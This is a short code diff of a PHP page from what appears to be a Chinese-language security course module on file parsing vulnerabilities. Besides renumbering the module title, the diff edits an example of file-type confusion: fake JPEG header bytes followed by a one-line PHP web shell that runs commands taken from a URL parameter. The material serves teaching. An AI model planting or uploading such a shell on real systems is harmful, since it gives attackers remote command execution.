@@ -1,6 +1,6 @@
 <?php
 // 解析漏洞学习资料
-$module_name = '文件解析漏洞';
+$module_name = '06. 文件解析漏洞';
 $module_icon = '🔍';
 $module_desc = '文件解析漏洞是由于服务器配置不当导致的文件类型解析错误，可能被攻击者利用上传恶意文件。';
 
@@ -103,7 +103,7 @@ $content = '<div class="card">
                     <h5 class="mb-3 mt-4">5. 文件类型混淆</h5>
                     <p>攻击者在PHP文件前添加图片头等内容，欺骗文件类型检测：</p>
                     <pre class="bg-dark text-light p-3 rounded"><code>\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00C\x00\x02\x01\x01\x01\x01\x02\x01\x01\x01\x02\x02\x02\x02\x02\x04\x03\x02\x02\x02\x02\x05\x04\x04\x03\x04\x06\x06\x08\x09\x08\x06\x06\x08\x08?&gt;
-&lt;?php system($_GET[\'cmd\']); ?&gt;</code></pre>
+&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
                 </div>
             </div>
 
